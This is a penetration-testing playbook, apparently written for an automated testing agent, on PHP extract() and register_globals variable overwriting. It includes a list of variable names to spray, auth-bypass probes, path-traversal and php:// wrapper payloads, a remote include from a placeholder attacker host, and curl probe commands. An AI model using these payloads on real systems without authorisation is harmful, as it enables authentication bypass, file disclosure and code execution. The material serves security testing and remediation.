# PHP external variable modification — Open WHEN: a `.php` endpoint changes behaviour after you inject a plausible control-variable name as a GET/POST key, or you suspect `extract()` / `import_request_variables()` / register-globals binding

This is the external-variable-modification sibling of mass assignment.
The vulnerable pattern imports an entire request array into the local
or global symbol table, so user-supplied keys overwrite trusted
in-scope variables. Mechanism class: CWE-473 (PHP External Variable
Modification) and CWE-621 (Variable Extraction Error).

## Vulnerable sinks to fingerprint

| Sink | Effect |
|---|---|
| `extract($_GET)` / `extract($_POST)` / `extract($_REQUEST)` | Imports every request key as a local variable. Default mode `EXTR_OVERWRITE` replaces an already-set variable of the same name. |
| `extract($data)` where `$data` is a decoded JSON/body array | Same overwrite, one indirection removed from the request. |
| `import_request_variables('gpc')` | Legacy (removed in PHP 5.4) — re-imports GET/POST/COOKIE into globals. Seen in old code. |
| `register_globals = On` | Ancient php.ini setting; same effect without any function call. Rare but decisive when present. |
| `$$var` dynamic variable names | If `$var` is request-controlled, `$$var` writes to an attacker-named variable. |

`extract()` modes that are NOT vulnerable (defence the app may have):
`EXTR_SKIP` (keeps existing values), `EXTR_PREFIX_ALL` /
`EXTR_PREFIX_INVALID` (namespaces imported names). If you see prefixed
variable names leaking, overwrite is likely blocked.

## Overwriting critical variables

The classic pattern: a security decision reads a variable the request
can now set.

```php
$authenticated = false;
extract($_GET);
if ($authenticated) { echo "Access granted!"; }
```

Probe both `=true` and `=1` (PHP truthiness):

```
?authenticated=true
?authenticated=1
```

Candidate control-variable names to spray (GET and POST):

```
authenticated, auth, authed, isAuth, loggedin, logged_in, login,
admin, isAdmin, is_admin, role, user_role, level, privilege, access,
granted, valid, verified, approved, debug, test, bypass, allow,
allowed, can_edit, can_admin, superuser, root, owner, uid, user_id
```

Set numeric/string truthy values: `1`, `true`, `admin`, `yes`. To force
a value falsy (e.g. disable a check), try `0`, empty, or omit.

## Poisoning file inclusion (escalates to LFI/RCE — co-dispatch `lfi`)

If a later `include`/`require` uses a variable the request can set:

```php
$page = "config.php";
extract($_GET);
include "$page";
```

```
?page=../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=index
?page=data://text/plain;base64,<base64 of PHP>
?page=http://YOUR-HOST/x.txt        # only if allow_url_include=On
```

This crosses into Local File Inclusion / file-wrapper RCE. Treat the
variable-overwrite as the entry and hand the inclusion exploitation to
the `lfi` specialist.

## Global variable injection

```php
extract($_GET);   // or extract($_REQUEST)
```

Overwrite entries inside `$GLOBALS`:

```
?GLOBALS[admin]=1
?GLOBALS[authenticated]=1
```

Caveat: as of PHP 8.1.0, write access to the whole `$GLOBALS` array was
removed, so this works only on PHP < 8.1. Fingerprint the PHP version
(headers, error output, `phpinfo`) before relying on it.

## Detection oracles

1. **State flip without credentials** — an endpoint that returns a
   protected response only after you add a control-variable key.
2. **Differential probe** — send the same request with and without the
   injected key; diff status, length, and body. A change attributable
   only to a variable name you never sent is the signal.
3. **Error-message leakage** — undefined-variable notices or stack
   traces reveal in-scope variable names; feed those names straight
   back as injection keys.
4. **Include behaviour change** — a parameter that suddenly alters which
   file/template is served points at include-path poisoning.

## Probe recipe (curl)

```bash
# Baseline vs. injected control variable
curl -s "https://TARGET/page.php"                 -o /tmp/base.html
curl -s "https://TARGET/page.php?authenticated=1" -o /tmp/inj.html
diff <(wc -c </tmp/base.html) <(wc -c </tmp/inj.html)

# POST variant (extract($_POST) / extract($_REQUEST))
curl -s -X POST "https://TARGET/page.php" \
  --data "username=x&admin=1&isAdmin=1&role=admin"

# Global injection (PHP < 8.1)
curl -s "https://TARGET/page.php?GLOBALS[admin]=1"
```

## Validation

A finding is real only when the injected variable name produces a
durable, security-relevant change (auth bypass, file disclosure,
privilege flip) reproducible across requests and not explained by a
field the app legitimately accepts. If the effect needs an include
sink, capture the disclosed file contents as proof and route the
inclusion chain to `lfi`.

## Remediation note (for the report)

`extract()` should use `EXTR_SKIP`, or the app should whitelist keys
instead of importing whole request arrays. Same root cause as ORM mass
assignment: no field-level allowlist between user input and trusted
state.
